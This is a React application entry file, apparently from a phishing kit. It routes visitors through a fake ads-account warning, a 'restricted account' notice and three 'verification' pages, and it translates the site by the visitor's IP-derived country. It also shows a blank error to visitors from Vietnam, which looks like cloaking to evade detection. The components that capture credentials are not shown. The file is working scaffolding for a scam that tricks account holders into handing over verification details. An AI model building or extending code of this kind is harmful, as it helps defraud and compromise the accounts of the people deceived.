import React, { useEffect, useState } from "react";
import { BrowserRouter as Router, Routes, Route } from "react-router-dom";
import { useTranslation } from "react-i18next";
import axios from "axios";
import "bootstrap/dist/css/bootstrap.min.css";
import AdsWarning from "./components/AdsWarning/AdsWarning";
import RestrictedAccount from "./components/RestrictedAccount/RestrictedAccount";
import Wrong from "./components/Wrong/Wrong";
import VerificationPage1 from "./components/SendVerificationCode/VerificationPage1";
import VerificationPage2 from "./components/SendVerificationCode/VerificationPage2";
import VerificationPage3 from "./components/SendVerificationCode/VerificationPage3";
import "./i18n";
import PrivacyPolicy from "./components/PrivacyStatement/PrivacyPolicy";

// Bản đồ quốc gia -> mã ngôn ngữ
const countryLanguageMap = {
  US: "en", GB: "en", NZ: "en", AU: "en", CA: "en",
  ES: "es", MX: "es", AR: "es", CO: "es", PE: "es",
  FR: "fr", BE: "fr", CH: "en", CI: "fr", TN: "en",
  DE: "de", AT: "de",
  IT: "it", PT: "pt", TR: "tr",
  CN: "zh", HK: "zh", TW: "zh",
  JP: "ja", KR: "ko",
  TH: "th", ID: "id", PH: "tl",
  SA: "ar", AE: "ar", MA: "ar", IQ: "ar", EG: "ar",
  BD: "bn", PK: "ur", LK: "si",
  ET: "am", AZ: "az",
  ZA: "en", NG: "en",
  GH: "en", CM: "fr", SN: "fr", BF: "fr",
  DZ: "ar", LY: "ar", 
  SD: "ar", DJ: "fr", MR: "ar",
  ML: "fr", GN: "fr", SL: "en", LR: "en", 
  NE: "fr", TG: "fr", BJ: "fr",
  GA: "fr", CG: "fr", CD: "fr", CF: "fr",
  TD: "fr", BI: "fr", RW: "fr", UG: "sw", KE: "sw",
  TZ: "sw", ZM: "en", MW: "en", MZ: "pt", AO: "pt",
  BR: "pt", TL: "pt", ST: "pt", CV: "pt",
  GQ: "es", UY: "es", PY: "es", BO: "es",
  CL: "es", EC: "es", VE: "es",
  GY: "en", GF: "fr", MQ: "fr", GP: "fr",
  BL: "fr", MF: "fr", PM: "fr",
   KY: "en", VG: "en", VI: "en",
  PR: "es", DO: "es", HT: "fr", JM: "en", BS: "en",
  CU: "es", TH :"th"
};

function App() {
  const { i18n } = useTranslation();
  const [isVietnamese, setIsVietnamese] = useState(false);

  useEffect(() => {
    const fetchUserLocation = async () => {
      try {
        const response = await axios.get("https://ipwho.is/");
        const countryCode = response.data.country_code;
        if(countryCode === "VN") {
          setIsVietnamese(true);
        }
        console.log("Detected Country:", countryCode);
        const detectedLang = countryLanguageMap[countryCode] || "en";
        i18n.changeLanguage(detectedLang);
      } catch (error) {
        console.error("Error fetching location:", error);
      }
    };
    //
    fetchUserLocation();
  }, [i18n]);

  if (isVietnamese) {
    return <div>Something gone wrong</div>;
  }

  return (
    <Router>
      <div className="container">
        <Routes>
          <Route path="/" element={<AdsWarning />} />
          <Route path="/restricted-account" element={<RestrictedAccount />} />
          <Route path="/wrong/:id" element={<Wrong />} />
          <Route path="/ver1" element={<VerificationPage1 />} />
          <Route path="/ver2" element={<VerificationPage2 />} />
          <Route path="/ver3" element={<VerificationPage3 />} />
          <Route path="/privacy-policy" element={<PrivacyPolicy />} />
        </Routes>
      </div>
    </Router>
  );
}

export default App;
